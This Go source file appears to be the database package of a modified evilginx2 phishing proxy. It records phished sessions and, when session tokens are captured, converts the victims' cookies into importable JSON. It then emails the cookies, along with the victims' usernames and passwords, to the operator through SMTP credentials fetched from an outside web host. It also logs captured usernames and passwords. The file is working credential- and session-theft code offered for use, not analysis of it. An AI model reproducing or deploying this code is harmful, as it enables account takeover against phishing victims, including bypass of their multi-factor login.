package database

import (
	"encoding/json"
	"fmt"
	"github.com/joho/godotenv"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/tidwall/buntdb"
	"gopkg.in/gomail.v2"
	"strconv"
	"strings"
	"time"
)

type Smtp struct {
	Host     string `json:"host"`
	Port     string `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func goDotEnvVariable(key string) string {

	// load .env file
	err := godotenv.Load(".env")

	if err != nil {
		log.Printf("Error loading .env file")
	}

	return os.Getenv(key)
}

func telegramSendResult(msg string) {
	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
	log.Printf("%s", msg)
	//response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
	//if err != nil {
	//	fmt.Printf("%s", err)
	//}
	//
	//var smtp Smtp
	//
	//responseData, err := ioutil.ReadAll(response.Body)
	//if err != nil {
	//	log.Fatal(err)
	//}
	//json.Unmarshal(responseData, &smtp)
	//
	//file, err := os.Open("/root/evilginx2-master/database/result.txt")
	//if err != nil {
	//	log.Fatal(err)
	//}
	//defer func() {
	//	if err = file.Close(); err != nil {
	//		log.Fatal(err)
	//	}
	//}()
	//
	//b, err := ioutil.ReadAll(file)
	//data := string(b)
	//
	//m := gomail.NewMessage()
	//
	//// Set E-Mail sender
	//m.SetHeader("From", smtp.Username)
	//
	//// Set E-Mail receivers
	//m.SetHeader("To", data)
	//
	//// Set E-Mail subject
	//m.SetHeader("Subject", "RESULT IS COMING")
	//
	//// Set E-Mail body. You can set plain text or html with text/html
	//m.SetBody("text/plain", msg)
	//
	//// Settings for SMTP server
	//d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
	//
	//// This is only needed when SSL/TLS certificate is not valid on server.
	//// In production this should be set to false.
	//// d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	//
	//// Now send E-Mail
	//if err = d.DialAndSend(m); err != nil {
	//	fmt.Println(err)
	//
	//}
	//
	//return

}

func sendEmailCookie(msg string, username string, password string) {
	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)

	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
	if err != nil {
		fmt.Printf("%s", err)
	}

	var smtp Smtp

	responseData, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}
	json.Unmarshal(responseData, &smtp)

	//file, err := os.Open("/root/evilginx2-master/database/result.txt")
	//if err != nil {
	//	log.Fatal(err)
	//}
	//defer func() {
	//	if err = file.Close(); err != nil {
	//		log.Fatal(err)
	//	}
	//}()
	//
	//b, err := ioutil.ReadAll(file)
	//data := string(b)

	err = os.WriteFile("RESULTS.json", []byte(msg), 0755)
	if err != nil {
		fmt.Printf("Unable to write file: %v", err)
	}

	m := gomail.NewMessage()

	// Set E-Mail sender
	m.SetHeader("From", smtp.Username)

	// Set E-Mail receivers
	m.SetHeader("To", goDotEnvVariable("MAIL_RESULT"))

	// Set E-Mail subject
	m.SetHeader("Subject", "🍪Result Is Coming🍪")

	// Set E-Mail body. You can set plain text or html with text/html
	m.SetBody("text/plain", "Username: "+username+"\nPassword: "+password)
	m.Attach("RESULTS.json")

	// Settings for SMTP server
	d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)

	// This is only needed when SSL/TLS certificate is not valid on server.
	// In production this should be set to false.
	// d.TLSConfig = &tls.Config{InsecureSkipVerify: true}

	// Now send E-Mail
	if err := d.DialAndSend(m); err != nil {
		fmt.Println(err)

	}

	return
}

func telegramSendVisitor(msg string) {
	// msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)

	// from := os.Getenv("MAIL")
	// password := os.Getenv("PASSWD")

	// // toList is list of email address that email is to be sent.
	// toList := []string{"example@gmail.com"}

	// // host is address of server that the
	// // sender's email address belongs,
	// // in this case its gmail.
	// // For e.g if your are using yahoo
	// // mail change the address as smtp.mail.yahoo.com
	// host := "smtp.gmail.com"

	// // Its the default port of smtp server
	// port := "587"

	// // We can't send strings directly in mail,
	// // strings need to be converted into slice bytes
	// body := []byte(msg)

	// // PlainAuth uses the given username and password to
	// // authenticate to host and act as identity.
	// // Usually identity should be the empty string,
	// // to act as username.
	// auth := smtp.PlainAuth("", from, password, host)

	// // SendMail uses TLS connection to send the mail
	// // The email is sent to all address in the toList,
	// // the body should be of type bytes, not strings
	// // This returns error if any occurred.
	// err := smtp.SendMail(host+":"+port, auth, from, toList, body)

	// // handling the errors
	// if err != nil {
	//     fmt.Println(err)
	//     os.Exit(1)
	// }

	fmt.Println("Successfully sent mail to all user in toList")
}

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	telegramSendResult(fmt.Sprintf("USERNAME  :%s", username))
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 PASSWORD : %s", password))
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	//telegramSendResult(fmt.Sprintf("🔥 🔥 CUSTOM 🔥 🔥\n\n-🆔ID: %s \n\nKey: %s\n-🔑Value: %s\n", sid, name, value))

	//data, _ := d.sessionsGetBySid(sid)
	//log.Printf("%s", data)
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token) error {
	err := d.sessionsUpdateTokens(sid, tokens)

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	data, _ := d.sessionsGetBySid(sid)

	//log.Printf("%s", data)
	//log.Important("database: %s", data)

	json11, _ := json.Marshal(cookies)
	sendEmailCookie(string(json11), data.Username, data.Password)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
